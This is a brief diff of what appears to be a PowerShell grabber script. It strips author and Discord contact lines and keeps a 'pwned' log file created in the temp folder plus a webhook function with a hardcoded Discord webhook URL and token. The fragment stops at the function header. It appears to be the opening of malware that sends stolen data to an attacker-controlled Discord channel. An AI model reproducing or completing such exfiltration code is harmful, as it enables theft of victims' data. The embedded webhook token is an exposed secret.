@@ -1,7 +1,4 @@
-# MADE BY SYKE
-# Discord: syke#1166 / Syke#1166
 
- 
  $generateLog = New-Item -Path $env:temp/pwned:).log -ItemType File -Force
 
  function Webhook($webhook = 'https://discord.com/api/webhooks/945312004728582165/y4E63O32Qxa-2pwakeuGXaI7KhchlUjrcsM7iD55HcZcUn65hGn-QhLlcvWFKgDb6O10'){
